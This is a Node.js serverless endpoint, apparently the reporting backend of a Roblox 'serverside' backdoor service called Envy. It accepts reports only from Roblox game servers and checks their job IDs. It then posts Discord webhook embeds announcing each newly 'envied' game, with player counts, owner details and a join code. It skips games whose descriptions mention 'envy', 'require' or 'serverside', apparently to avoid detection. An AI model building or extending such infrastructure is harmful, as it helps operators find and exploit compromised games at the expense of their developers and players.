const { Redis } = require('@upstash/redis');

async function cleanupStaleGames(redis, REAL_WEBHOOK_URL) {
    const STALE_GAME_SECONDS = 30 * 60; // Clean up if half an hour passed without a game update.
    const currentTime = Math.floor(Date.now() / 1000);
    let deletedCount = 0;
    
    try {
        const gameKeys = await redis.keys('game:*');
        if (gameKeys.length === 0) return;
    
        const gameDataArray = await redis.mget(...gameKeys);
    
        for (let i = 0; i < gameKeys.length; i++) {
            const key = gameKeys[i];
            const data = gameDataArray[i];
    
            if (data && data.timestamp && (currentTime - data.timestamp > STALE_GAME_SECONDS)) {
                console.log(`Cleanup: Found stale game ${key}. Deleting...`);
                const deleteUrl = `${REAL_WEBHOOK_URL}/messages/${data.messageId}`;
                fetch(deleteUrl, { method: 'DELETE' }).catch(e => {console.log(`Failed to delete message ${data.messageId}:`, e)}); // Fire and forget
                await redis.del(key);
                deletedCount++;
            }
        }
        if (deletedCount > 0) console.log(`Cleanup complete. Deleted ${deletedCount} stale game(s).`);
    } catch (error) {
        console.error("Background Cleanup Error:", error);
    }
}

async function fetchGameInfo(placeId) {
    try {
        // First, get universe ID from place ID
        const universeResponse = await fetch(
            `https://apis.roblox.com/universes/v1/places/${placeId}/universe`,
            { headers: { 'User-Agent': 'Agent-E' } }
        );
        if (!universeResponse.ok) {
            const errorText = await universeResponse.text();
            console.error("Universe fetch error:", errorText);
            throw new Error('Failed to fetch universe ID');
        } 
        const universeData = await universeResponse.json();
        const universeId = universeData.universeId;

        // Fetch game details
        const gameResponse = await fetch(
            `https://games.roblox.com/v1/games?universeIds=${universeId}`,
            { headers: { 'User-Agent': 'Agent-E' } }
        );
        if (!gameResponse.ok) {
            const errorText = await gameResponse.text();
            console.error("Game fetch error:", errorText);
            throw new Error('Failed to fetch game info');
        }
        const gameData = await gameResponse.json();
        const gameInfo = gameData.data[0];

        // Fetch thumbnail
        let thumbnail = "https://tr.rbxcdn.com/31c19d85d08e6c3e7f20d88c614f06cb/512/512/Image/Png";
        try {
            const thumbResponse = await fetch(
                `https://thumbnails.roblox.com/v1/games/icons?universeIds=${universeId}&size=512x512&format=Png`,
                { headers: { 'User-Agent': 'Agent-E' } }
            );
            if (thumbResponse.ok) {
                const thumbData = await thumbResponse.json();
                if (thumbData.data && thumbData.data[0]) {
                    thumbnail = thumbData.data[0].imageUrl;
                }
            }
        } catch (e) {
            console.error("Thumbnail fetch error:", e);
        }

        return { gameInfo, universeId, thumbnail };
    } catch (error) {
        console.error("Error fetching game info:", error);
        throw error;
    }
}

function formatNumber(n) {
    n = parseInt(n);
    if (isNaN(n)) return "Unknown";
    return n >= 1e6 ? `${(n / 1e6).toFixed(1)}M`
        : n >= 1e3 ? `${(n / 1e3).toFixed(1)}K`
        : n.toString();
}

function formatDate(dateString) {
    try {
        const date = new Date(dateString);
        const now = new Date();
        const diffMs = now - date;
        const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
        const diffHours = Math.floor(diffMs / (1000 * 60 * 60));
        const diffMinutes = Math.floor(diffMs / (1000 * 60));

        // Format absolute date
        const month = String(date.getMonth() + 1).padStart(2, '0');
        const day = String(date.getDate()).padStart(2, '0');
        const year = date.getFullYear();
        const absoluteDate = `${month}/${day}/${year}`;

        // Format relative time
        let relativeTime;
        if (diffMinutes < 60) {
            relativeTime = `${diffMinutes} minute${diffMinutes !== 1 ? 's' : ''} ago`;
        } else if (diffHours < 24) {
            relativeTime = `${diffHours} hour${diffHours !== 1 ? 's' : ''} ago`;
        } else if (diffDays < 30) {
            relativeTime = `${diffDays} day${diffDays !== 1 ? 's' : ''} ago`;
        } else if (diffDays < 365) {
            const months = Math.floor(diffDays / 30);
            relativeTime = `${months} month${months !== 1 ? 's' : ''} ago`;
        } else {
            const years = Math.floor(diffDays / 365);
            relativeTime = `${years} year${years !== 1 ? 's' : ''} ago`;
        }

        return `${relativeTime} (${absoluteDate})`;
    } catch (e) {
        return "Unknown";
    }
}


function createDiscordEmbed(gameInfo, placeId, thumbnail, isNonHttp = false) {
    let creator = "";
    if (gameInfo.creator.type === "User") {
        creator = `**Owner**: [${gameInfo.creator.name}](https://www.roblox.com/users/${gameInfo.creator.id || 0}/profile)\n` +
                  `**ID**: \`${gameInfo.creator.id}\`\n` +
                  `**Verified**: \`${gameInfo.creator.hasVerifiedBadge}\``;
    } else {
        creator = `**Owner**: [${gameInfo.creator.name}](https://www.roblox.com/communities/${gameInfo.creator.id || 0})`;
    }

    return {
        content: "",
        username: "Envy Messenger",
        avatar_url: "https://i.ibb.co/TMQbDpH8/image.png",
        embeds: [{
            title: gameInfo.name,
            url: `https://www.roblox.com/games/${placeId}`,
            color: parseInt("0x8200c8", 16),
            author: {
                name: "A new game has been envied!",
                icon_url: "https://i.ibb.co/TMQbDpH8/image.png"
            },
            thumbnail: { url: thumbnail },
            fields: [
                {
                    name: "> **Game Information**",
                    value: `**Players**: \`${gameInfo.playing}\`\n` +
                           `**Server Size**: \`${gameInfo.maxPlayers || "Unknown"}\`\n` +
                           `**Visits**: \`${formatNumber(gameInfo.visits)}\`\n` +
                           `**Favorites**: \`${formatNumber(gameInfo.favoritedCount)}\`\n` +
                           `**Genre**: \`${gameInfo.genre}\`\n` +
                           `**Description**: ${gameInfo.description || "No description"}\n` +
                           `**Last Game Update**: \`${formatDate(gameInfo.updated)}\`` + (isNonHttp ?  
                           `\n**WARNING**: This game is non-HTTP Enabled and may provide inaccurate data.` : ""),
                    inline: true
                },
                {
                    name: "> **Owner Information**",
                    value: creator,
                    inline: true
                },
                {
                    name: "**Javascript Join Code**",
                    value: `\`\`\`js\nRoblox.GameLauncher.joinGameInstance(${placeId}, "")\n\`\`\``,
                    inline: false
                }
            ],
            footer: {
                icon_url: "https://i.ibb.co/TMQbDpH8/image.png",
                text: "Envy Serverside"
            },
            timestamp: new Date().toISOString()
        }]
    };
}

module.exports = async function handler(req, res) {
    const redis = new Redis({ 
        url: process.env.KV_REST_API_URL,
        token: process.env.KV_REST_API_TOKEN,
    });
    const REAL_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
    const SECRET_HEADER = process.env.SECRET_HEADER_KEY;
    const AUTH_CACHE_EXPIRATION_SECONDS = 300; // 5 minutes
    
    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed.');
    if (req.headers['x-secret-header'] !== SECRET_HEADER) return res.status(401).send('Unauthorized');
    console.log(`Payload: ${JSON.stringify(req.body)}`);
    console.log(`Headers: ${JSON.stringify(req.headers)}`);
    let placeId, isNonHttp = false;
    if(req.headers['user-agent'] !== "Roblox/Linux")
    {
        console.log("WOAH STOP RIGHT THERE U CRIMINAL SCUM");
        return res.status(400).send('Access Denied');
    }
    if (req.body && req.body.fromNonHttp) {
        console.log(`Someone tried to exploit the vulnerability`);
        console.log(req.body);
        return;
    } else{

        // Extract Place ID from Roblox-Id header
        const robloxIdHeader = req.headers['roblox-id'];
        
        if (!robloxIdHeader || robloxIdHeader === "0") {
            return res.status(400).send('Bad Request');
        }
        
        // Parse Place ID from header (format might be "placeId=123456" or just "123456")
        
        const placeIdMatch = robloxIdHeader.match(/placeId=(\d+)/);
        if (placeIdMatch) {
            placeId = placeIdMatch[1];
        } else if (/^\d+$/.test(robloxIdHeader)) {
            placeId = robloxIdHeader;
        } else {
            return res.status(400).send('Bad Request:');
        }
    }
    const jobId = req.body.jobId;
    if (!jobId || !placeId) {
        console.log("sus required data miss...");
        console.log(`jobId: ${jobId}\n placeId: ${placeId}\n isNonHttp: ${isNonHttp}`);
        return res.status(400).send('Bad Request: Missing required data.');
    }

    // Verify JobId authenticity
    async function isJobIdAuthentic(placeId, targetJobId) {
        const apiUrl = 'https://gamejoin.roblox.com/v1/join-game-instance';
        try {
            const apiResponse = await fetch(apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Roblox/WinInet'
                },
                body: JSON.stringify({
                    placeId: placeId,
                    gameId: targetJobId
                })
            });
            return apiResponse.status < 500;
        } catch (error) {
            console.error("Error during JobId authentication:", error);
            return false;
        }
    }

    const authCacheKey = `auth:${jobId}`;
    const isAlreadyAuthenticated = await redis.get(authCacheKey);

    if (!isAlreadyAuthenticated) {
        console.log(`JobId ${jobId} not in cache. Performing live authentication...`);
        const isAuthentic = await isJobIdAuthentic(placeId, jobId);

        if (!isAuthentic) {
            console.warn(`Rejected unauthenticated JobId: ${jobId}`);
            return res.status(403).send('Forbidden: JobId authentication failed.');
        }
        await redis.set(authCacheKey, 'true', { ex: AUTH_CACHE_EXPIRATION_SECONDS });
    }

    // Rate limiting
    const rateLimitKey = `rate:${jobId}`;
    const currentRequests = await redis.incr(rateLimitKey);
    if (currentRequests === 1) await redis.expire(rateLimitKey, 60);
    if (currentRequests > 20) return res.status(429).send('Too Many Requests');

    try {
        // Fetch game information from Roblox APIs
        const { gameInfo, universeId, thumbnail } = await fetchGameInfo(placeId);
        
        const gameKey = `game:${universeId}`;
        let gameData = await redis.get(gameKey);
        let messageId = gameData ? gameData.messageId : null;
        const currentTime = Math.floor(Date.now() / 1000);
        if (gameInfo.playing === 0 || gameInfo.description?.includes("envy") || gameInfo.description?.includes("require") || gameInfo.description?.includes("serverside")) {
            
            if (messageId) {
                const deleteUrl = `${REAL_WEBHOOK_URL}/messages/${messageId}`;
                await fetch(deleteUrl, { method: 'DELETE' });
                await redis.del(gameKey);
            }
            if(gameInfo.playing !== 0)
            {
                console.log(gameInfo.description);
            }
            return res.status(200).json({ success: true, action: 'skipped_empty_game' });
        }

        // Create Discord embed
        const payload = createDiscordEmbed(gameInfo, placeId, thumbnail, isNonHttp);
        
        const headers = { 'Content-Type': 'application/json', 'User-Agent': 'Agent-E' };

        if (!messageId) {
            // todo: check if gameInfo.playing = 0 then don't send a message. 
            const createUrl = `${REAL_WEBHOOK_URL}?wait=true`;
            const createResponse = await fetch(createUrl, { 
                method: 'POST', 
                headers, 
                body: JSON.stringify(payload) 
            });
            if (!createResponse.ok) throw new Error(`Discord API Error on POST: ${createResponse.status}`);
            const responseData = await createResponse.json();
            messageId = responseData.id;
        } else {
            const editUrl = `${REAL_WEBHOOK_URL}/messages/${messageId}`;
            await fetch(editUrl, { 
                method: 'PATCH', 
                headers, 
                body: JSON.stringify(payload) 
            });
        }
        
        const newGameData = { messageId: messageId, timestamp: currentTime, placeId: placeId };
        await redis.set(gameKey, newGameData);
        
        res.status(200).json({ success: true });
        cleanupStaleGames(redis, REAL_WEBHOOK_URL);
    } catch (error) {
        console.error("Main Handler Error:", error);
        if (!res.headersSent) {
            return res.status(500).send(`Internal Server Error: ${error.message}`);
        }
    }
};
